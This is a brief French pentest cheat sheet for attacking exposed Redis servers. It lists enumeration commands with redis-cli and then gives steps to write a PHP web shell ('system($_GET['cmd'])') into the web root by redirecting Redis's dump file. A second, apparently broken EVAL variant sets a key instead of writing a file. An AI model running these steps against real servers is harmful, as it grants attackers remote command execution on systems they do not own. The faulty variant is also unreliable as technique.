# Redis

Connect to redis server

```sh
redis-cli -h <host> -p <port>
```

Pour voir combien de bases sont configurées :

```sh
CONFIG GET databases
```

Pour voir quelles bases contiennent des données :

```sh
INFO keyspace
```

Voir le contenu

```sh
KEYS *
```

Ecrire un script PHP dans un fichier du serveur web.

```sh
CONFIG SET dir /var/www/html
CONFIG SET dbfilename rshell.php
SET dummy "<?php system($_GET['cmd']); ?>"
save
```

OU

```sh
EVAL "return redis.call('set', '/var/www/html/test.php', '<?php exec('bash code') ?>')" 0
```